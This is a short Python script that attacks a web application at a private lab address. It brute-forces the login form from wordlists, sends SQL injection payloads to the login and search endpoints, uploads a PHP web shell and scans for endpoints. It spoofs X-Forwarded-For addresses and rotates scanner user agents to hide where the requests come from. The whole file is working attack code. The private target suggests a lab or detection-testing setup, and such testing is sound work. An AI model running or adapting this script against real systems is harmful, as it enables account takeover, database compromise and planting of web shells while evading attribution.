import requests
import random
import time

BASE_URL = "http://192.168.253.136:8080"

def load_lines(path):
	with open(path, "r") as f:
		return [line.strip() for line in f.readlines() if line.strip()]

def random_ip():
	return f"{random.randint(11,250)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def send_request(method, url, **kwargs):
	fake_ip = random_ip()
	headers = kwargs.get("headers",{})
	headers.update({
		"X-Forwarded-For": fake_ip,
        "User-Agent": random.choice([
            "sqlmap/1.6.10", "Mozilla/5.0", "curl/7.64.1", "FuzzScanner/1.0"
        ])
	})
	kwargs["headers"] = headers

	try:
		r = requests.request(method, url, **kwargs)
		print(f"[{r.status_code}] {method} {url} from {fake_ip}")
		return r
	except Exception as e:
		print(f"[!] Request error: {e}")
def bruteforce_login():
	usernames = load_lines("wordlists/usernames.txt")
	passwords = load_lines("wordlists/passwords.txt")
	print("\n[+] Bruteforce Login:")
	for user in usernames:
		for pwd in passwords:
			data = {"username": user, "password": pwd}
			r = send_request("POST", f"{BASE_URL}/login",data = data)
			if r.status_code == 302 or "Welcome" in r.text or "dashboard" in r.text.lower():
				print(f"[✓] SUCCESS: {user}:{pwd}")
			else:
				print(f"[×] Failed: {user}:{pwd}")
			time.sleep(0.3)
def sql_injection_attack():
	payloads = load_lines("wordlists/sql_payloads.txt")
	print("\n[+] SQL Injection Attack:")

	for payload in payloads:
		data = {"username": payload, "password":"test"}
		send_request("POST", f"{BASE_URL}/login", data=data)

		send_request("GET", f"{BASE_URL}/search?q={payload}")
		time.sleep(0.3)
def upload_malicious_file():
	print("\n[+] Upload Malicious File:")
	file_path = "payloads/shell.php"
	files = {'file': open(file_path, 'rb')}
	send_request("POST", f"{BASE_URL}/upload", files = files)
def scan_endpoints():
	endpoints = load_lines("wordlists/endpoints.txt")
	print("\n[+] Scanning API Endpoints:")

	for ep in endpoints:
		full_url = f"{BASE_URL}/{ep}"
		send_request("GET",full_url)
		time.sleep(0.3)

if __name__=="__main__":
	bruteforce_login()
	sql_injection_attack()
	upload_malicious_file()
	scan_endpoints()